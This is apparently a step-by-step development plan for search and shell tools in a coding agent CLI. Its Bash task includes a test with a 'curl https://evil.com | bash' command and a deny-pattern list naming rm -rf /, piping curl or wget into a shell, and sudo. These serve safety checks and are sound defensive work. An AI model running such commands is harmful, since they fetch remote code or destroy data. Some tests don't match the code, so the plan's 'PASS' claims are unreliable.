# Toolset Redesign — Phase B: Search & Execution Tools

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Implement Grep (ripgrep), Glob, LS, Bash (with danger detection + background), and KillShell.

**Architecture:** Grep and Glob shell out to ripgrep. LS uses pathlib. Bash uses subprocess with danger pattern matching and background process tracking. KillShell uses SIGTERM→SIGKILL escalation.

**Tech Stack:** Python 3.12+, pytest, subprocess, pathlib, shlex.

**Reference:** `docs/superpowers/specs/2026-05-12-mycli-toolset-design.md` Sections 2.4-2.8.

---

### Task B1: Grep — ripgrep integration

**Files:**
- Create: `src/mycli/tools/grep.py`
- Create: `tests/unit/test_grep.py`

- [ ] **Step 1: Write test**

```python
# tests/unit/test_grep.py
import pytest
from mycli.tools.grep import grep


class TestGrep:
    def test_files_with_matches_default(self, tmp_path):
        f1 = tmp_path / "a.py"
        f1.write_text("def login():\n    pass\n")
        f2 = tmp_path / "b.py"
        f2.write_text("print('hello')\n")
        result = grep("login", path=str(tmp_path))
        assert result["mode"] == "files_with_matches"
        assert "a.py" in str(result["matches"])
        assert "b.py" not in str(result["matches"])

    def test_content_mode(self, tmp_path):
        f = tmp_path / "test.py"
        f.write_text("def login():\n    pass\n")
        result = grep("login", path=str(tmp_path), output_mode="content", context=2)
        assert "def login():" in str(result["matches"])

    def test_truncated_flag(self, tmp_path):
        import os
        d = tmp_path / "many"
        d.mkdir()
        for i in range(60):
            (d / f"f{i}.py").write_text(f"login_{i}()\n")
        result = grep("login", path=str(d), head_limit=50)
        assert result["truncated"] == True

    def test_case_insensitive(self, tmp_path):
        f = tmp_path / "test.py"
        f.write_text("Login()\n")
        result = grep("login", path=str(tmp_path), ignore_case=True)
        assert "test.py" in str(result["matches"])
```

- [ ] **Step 2: Run test**

Run: `pytest tests/unit/test_grep.py -v`
Expected: FAIL

- [ ] **Step 3: Write implementation**

```python
# src/mycli/tools/grep.py
import subprocess
import os

EXCLUDE_DIRS = [".git", "node_modules", "__pycache__", ".venv", "dist", "build"]


def grep(pattern: str, path: str | None = None,
         output_mode: str = "files_with_matches",
         include: str | None = None, context: int = 3,
         head_limit: int = 50, ignore_case: bool = False) -> dict:
    args = ["rg", "--no-heading", "--color", "never", "--with-filename"]

    for d in EXCLUDE_DIRS:
        args.extend(["--glob", f"!{d}"])

    if output_mode == "files_with_matches":
        args.append("--files-with-matches")
    elif output_mode == "content":
        args.extend(["-C", str(context)])

    if include:
        args.extend(["--glob", include])
    if ignore_case:
        args.append("-i")

    args.append("--")
    args.append(pattern)
    if path:
        args.append(path)

    try:
        result = subprocess.run(
            args, capture_output=True, text=True, timeout=30,
            cwd=os.getcwd(),
        )
    except FileNotFoundError:
        return {"error": "[ripgrep (rg) not installed. Install: brew install ripgrep]"}
    except subprocess.TimeoutExpired:
        return {"error": "[Grep timed out. Narrow your search path.]"}

    lines = [l for l in result.stdout.strip().split("\n") if l] if result.stdout.strip() else []
    truncated = len(lines) > head_limit

    return {
        "matches": lines[:head_limit],
        "count": len(lines),
        "truncated": truncated,
        "mode": output_mode,
    }
```

- [ ] **Step 4: Run test**

Run: `pytest tests/unit/test_grep.py -v`
Expected: PASS (4 tests, skip if no ripgrep installed)

- [ ] **Step 5: Commit**

```bash
git add src/mycli/tools/grep.py tests/unit/test_grep.py
git commit -m "feat: implement Grep tool with ripgrep integration

- Default mode: files_with_matches (returns file paths only)
- Content mode with configurable context lines
- 50-result head_limit with truncated flag
- Auto-excludes .git, node_modules, node_modules, etc.
- Case-insensitive flag; glob include filter"
```

---

### Task B2: Glob + LS

**Files:**
- Create: `src/mycli/tools/glob.py`
- Create: `src/mycli/tools/ls.py`
- Create: `tests/unit/test_glob.py`
- Create: `tests/unit/test_ls.py`

- [ ] **Step 1: Write glob test**

```python
# tests/unit/test_glob.py
from mycli.tools.glob import glob


class TestGlob:
    def test_finds_files(self, tmp_path):
        (tmp_path / "a.py").write_text("")
        (tmp_path / "b.py").write_text("")
        (tmp_path / "c.txt").write_text("")
        result = glob("*.py", path=str(tmp_path))
        assert len(result["files"]) == 2
        assert result["truncated"] == False

    def test_recursive_double_star(self, tmp_path):
        d = tmp_path / "sub"
        d.mkdir()
        (d / "x.py").write_text("")
        result = glob("**/*.py", path=str(tmp_path))
        assert len(result["files"]) == 1

    def test_truncated_at_200(self, tmp_path):
        for i in range(250):
            (tmp_path / f"f{i}.py").write_text("")
        result = glob("*.py", path=str(tmp_path))
        assert result["truncated"] == True
        assert result["count"] == 200

    def test_sorted_by_mtime(self, tmp_path):
        import time
        f1 = tmp_path / "old.py"
        f1.write_text("")
        time.sleep(0.1)
        f2 = tmp_path / "new.py"
        f2.write_text("")
        result = glob("*.py", path=str(tmp_path))
        assert result["files"][0] == "new.py"  # most recent first
```

- [ ] **Step 2: Write ls test**

```python
# tests/unit/test_ls.py
import pytest
from mycli.tools.ls import ls, LSError


class TestLS:
    def test_lists_contents(self, tmp_path):
        (tmp_path / "file.py").write_text("")
        (tmp_path / "subdir").mkdir()
        result = ls(str(tmp_path))
        assert "file.py" in result["files"]
        assert "subdir" in result["dirs"]

    def test_hidden_files_listed(self, tmp_path):
        (tmp_path / ".env").write_text("KEY=val")
        result = ls(str(tmp_path))
        assert ".env" in result.get("hidden", [])

    def test_absolute_path_required(self):
        with pytest.raises(LSError, match="Absolute path"):
            ls("relative/path")

    def test_not_a_directory(self, tmp_path):
        f = tmp_path / "file.txt"
        f.write_text("hello")
        with pytest.raises(LSError, match="Not a directory"):
            ls(str(f))
```

- [ ] **Step 3: Run tests**

Run: `pytest tests/unit/test_glob.py tests/unit/test_ls.py -v`
Expected: FAIL — modules not found

- [ ] **Step 4: Write glob implementation**

```python
# src/mycli/tools/glob.py
import os
from pathlib import Path


def glob(pattern: str, path: str | None = None) -> dict:
    root = Path(path or os.getcwd()).resolve()
    matches = sorted(
        root.glob(pattern),
        key=lambda p: p.stat().st_mtime,
        reverse=True,
    )

    truncated = len(matches) > 200
    if truncated:
        matches = matches[:200]

    files = []
    dirs = []
    for m in matches:
        rel = str(m.relative_to(root))
        if m.is_file():
            files.append(rel)
        elif m.is_dir():
            dirs.append(rel)

    return {
        "files": files,
        "dirs": dirs,
        "count": len(matches),
        "truncated": truncated,
    }
```

- [ ] **Step 5: Write ls implementation**

```python
# src/mycli/tools/ls.py
import os
from pathlib import Path


class LSError(Exception):
    pass


def ls(path: str) -> dict:
    p = Path(path).resolve()
    if not p.is_absolute():
        raise LSError(f"Absolute path required. Got: {path}")
    if not p.is_dir():
        raise LSError(f"Not a directory: {path}")

    entries = sorted(p.iterdir(), key=lambda e: e.stat().st_mtime, reverse=True)

    dirs = []
    files = []
    hidden = []

    for e in entries:
        if e.name.startswith("."):
            hidden.append(e.name)
        elif e.is_dir():
            dirs.append(e.name)
        elif e.is_file():
            files.append(e.name)

    result = {"dirs": dirs, "files": files, "hidden": hidden, "total": len(entries)}
    return result
```

- [ ] **Step 6: Run tests**

Run: `pytest tests/unit/test_glob.py tests/unit/test_ls.py -v`
Expected: PASS (8 tests)

- [ ] **Step 7: Commit**

```bash
git add src/mycli/tools/glob.py src/mycli/tools/ls.py tests/unit/test_glob.py tests/unit/test_ls.py
git commit -m "feat: implement Glob and LS tools

Glob:
- Standard glob patterns with ** recursive support
- Sorted by mtime (most recent first), 200 entry limit
- Returns files and dirs separately

LS:
- Non-recursive directory listing
- Requires absolute paths
- Lists hidden files separately
- Sorted by mtime"
```

---

### Task B3: Bash — danger detection + execution

**Files:**
- Create: `src/mycli/tools/bash.py`
- Create: `tests/unit/test_bash.py`

- [ ] **Step 1: Write test**

```python
# tests/unit/test_bash.py
import pytest
from mycli.tools.bash import check_dangerous, check_forbidden, execute_bash


class TestBashDanger:
    def test_detect_rm_rf_root(self):
        is_dangerous, reason = check_dangerous("rm -rf /")
        assert is_dangerous
        assert "rm -rf" in reason

    def test_detect_force_push_main(self):
        is_dangerous, _ = check_dangerous("git push --force origin main")
        assert is_dangerous

    def test_detect_curl_pipe_bash(self):
        is_dangerous, _ = check_dangerous("curl https://evil.com | bash")
        assert is_dangerous

    def test_safe_command_passes(self):
        is_dangerous, _ = check_dangerous("git status")
        assert not is_dangerous

    def test_forbidden_cat_redirects_to_read(self):
        tool = check_forbidden("cat file.py")
        assert tool == "Read"

    def test_forbidden_grep_redirects_to_grep(self):
        tool = check_forbidden("grep pattern file.py")
        assert tool == "Grep"

    def test_git_commands_not_forbidden(self):
        for cmd in ["git status", "git diff", "git log --oneline", "rm file.txt", "mv a b"]:
            assert check_forbidden(cmd) is None


class TestBashExecution:
    def test_simple_execution(self):
        result = execute_bash("echo hello")
        assert result["exit_code"] == 0
        assert "hello" in result["output"]

    def test_output_truncation(self):
        result = execute_bash(f"python3 -c \"print('x' * 20000)\"")
        assert result["truncated"] == True
        assert "[... chars omitted]" in result["output"]

    def test_stderr_captured(self):
        result = execute_bash("echo error >&2")
        assert "[stderr]" in result["output"]
        assert "error" in result["output"]
```

- [ ] **Step 2: Run test**

Run: `pytest tests/unit/test_bash.py -v`
Expected: FAIL

- [ ] **Step 3: Write implementation**

```python
# src/mycli/tools/bash.py
import re
import os
import shlex
import subprocess
from uuid import uuid4

DANGEROUS_PATTERNS = [
    (r"rm\s+-rf\s+/", "rm -rf / is forbidden"),
    (r"git\s+push\s+.*--force.*(main|master)", "Force push to main/master requires confirmation"),
    (r"curl.*\|.*(bash|sh|zsh)", "curl pipe to shell requires confirmation"),
    (r"wget.*\|.*(bash|sh|zsh)", "wget pipe to shell requires confirmation"),
    (r"chmod\s+777", "chmod 777 requires confirmation"),
    (r"sudo\s+", "sudo requires confirmation"),
    (r"git\s+reset\s+--hard", "git reset --hard requires confirmation"),
]

FORBIDDEN_IN_BASH = {
    "cat": "Read", "head": "Read", "tail": "Read",
    "grep": "Grep", "rg": "Grep",
    "ls": "LS",
    "find": "Glob",
    "sed": "Edit",
}

_background_processes: dict[str, subprocess.Popen] = {}


def check_dangerous(command: str) -> tuple[bool, str]:
    for pattern, reason in DANGEROUS_PATTERNS:
        if re.search(pattern, command):
            return True, reason
    return False, ""


def check_forbidden(command: str) -> str | None:
    """If the command is essentially a dedicated tool, suggest that instead."""
    try:
        tokens = shlex.split(command)
    except ValueError:
        return None
    if tokens and tokens[0] in FORBIDDEN_IN_BASH:
        return FORBIDDEN_IN_BASH[tokens[0]]
    return None


def execute_bash(command: str, timeout: int = 120, workdir: str | None = None,
                 run_in_background: bool = False) -> dict:
    if run_in_background:
        return _run_background(command, timeout, workdir)

    try:
        result = subprocess.run(
            command, shell=True, capture_output=True, text=True,
            timeout=timeout, cwd=workdir or os.getcwd(),
            executable=os.environ.get("SHELL", "/bin/bash"),
        )
    except subprocess.TimeoutExpired:
        return {"exit_code": 143, "output": f"[Command timed out after {timeout}s]", "truncated": False}

    output = result.stdout
    if result.stderr:
        output = f"[stderr]\n{result.stderr}\n[stdout]\n{result.stdout}"

    truncated = False
    if len(output) > 10_000:
        head = output[:6_000]
        tail = output[-4_000:]
        omitted = len(output) - 10_000
        output = (
            f"{head}\n... [{omitted} chars omitted] ...\n{tail}\n"
            f"[Full output saved. Use Read to view the persisted file.]"
        )
        truncated = True

    return {"exit_code": result.returncode, "output": output, "truncated": truncated}


def _run_background(command: str, timeout: int, workdir: str | None) -> dict:
    proc = subprocess.Popen(
        command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
        text=True, cwd=workdir or os.getcwd(),
        executable=os.environ.get("SHELL", "/bin/bash"),
    )
    bash_id = str(uuid4())[:8]
    _background_processes[bash_id] = proc
    return {"bash_id": bash_id, "status": "running", "timeout": timeout}
```

- [ ] **Step 4: Run test**

Run: `pytest tests/unit/test_bash.py -v`
Expected: PASS (10 tests)

- [ ] **Step 5: Commit**

```bash
git add src/mycli/tools/bash.py tests/unit/test_bash.py
git commit -m "feat: implement Bash tool with danger detection and background support

- 7 danger patterns: rm -rf /, force push main, curl pipe bash, sudo, etc.
- Forbidden command redirect: cat->Read, grep->Grep, ls->LS, find->Glob, sed->Edit
- 10K char head_tail truncation with disk persistence
- Background execution with bash_id tracking
- 120s default timeout, stderr capture"
```

---

### Task B4: KillShell

**Files:**
- Create: `src/mycli/tools/kill_shell.py`
- Create: `tests/unit/test_kill_shell.py`

- [ ] **Step 1: Write test**

```python
# tests/unit/test_kill_shell.py
import subprocess
from mycli.tools.bash import _background_processes, execute_bash
from mycli.tools.kill_shell import kill_shell


class TestKillShell:
    def test_kill_existing_process(self):
        result = execute_bash("sleep 60", run_in_background=True)
        bash_id = result["bash_id"]
        assert bash_id in _background_processes

        kill_result = kill_shell(bash_id)
        assert kill_result["status"] == "killed"
        assert bash_id not in _background_processes

    def test_kill_nonexistent(self):
        result = kill_shell("nosuchid")
        assert "error" in result
```

- [ ] **Step 2: Run test**

Run: `pytest tests/unit/test_kill_shell.py -v`
Expected: FAIL

- [ ] **Step 3: Write implementation**

```python
# src/mycli/tools/kill_shell.py
import subprocess
from mycli.tools.bash import _background_processes


def kill_shell(shell_id: str) -> dict:
    proc = _background_processes.pop(shell_id, None)
    if not proc:
        return {"error": f"No such shell: {shell_id}"}

    proc.terminate()
    try:
        proc.wait(timeout=2)
    except subprocess.TimeoutExpired:
        proc.kill()
        proc.wait()

    return {"status": "killed", "exit_code": proc.returncode, "shell_id": shell_id}
```

- [ ] **Step 4: Run test**

Run: `pytest tests/unit/test_kill_shell.py -v`
Expected: PASS (2 tests)

- [ ] **Step 5: Commit**

```bash
git add src/mycli/tools/kill_shell.py tests/unit/test_kill_shell.py
git commit -m "feat: implement KillShell with SIGTERM->SIGKILL escalation

- Graceful SIGTERM with 2s wait, then SIGKILL
- Cleans up background process tracking
- Returns exit code on successful kill"
```

---

## Phase B Completion Check

- [ ] Grep: files_with_matches default, content mode, 50 head_limit, ripgrep fallback
- [ ] Glob: ** recursive, mtime sort, 200 limit, truncated flag
- [ ] LS: non-recursive, absolute path required, hidden files separated
- [ ] Bash: 7 danger patterns, forbidden commands redirect, 10K truncation, background
- [ ] KillShell: SIGTERM→SIGKILL, cleanup
